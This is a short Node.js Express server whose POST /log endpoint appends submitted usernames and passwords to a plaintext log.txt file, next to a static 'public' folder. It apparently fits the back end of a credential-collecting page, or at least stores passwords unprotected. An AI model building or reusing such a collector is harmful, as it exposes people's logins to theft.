const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.post('/log', (req, res) => {
    const userInput = req.body.input;
    const username = req.body.username || 'Anonymous'; // Default to 'Anonymous' if no username is provided

    if (userInput) {
        const logEntry = `${new Date().toISOString()} -      username: ${username}        password: ${userInput}\n\n`;
        
        fs.appendFile('log.txt', logEntry, (err) => {
            if (err) throw err;
            console.log('Log entry added.');
            res.send('Log entry added.');
        });
    } else {
        res.status(400).send('Invalid input');
    }
});

app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
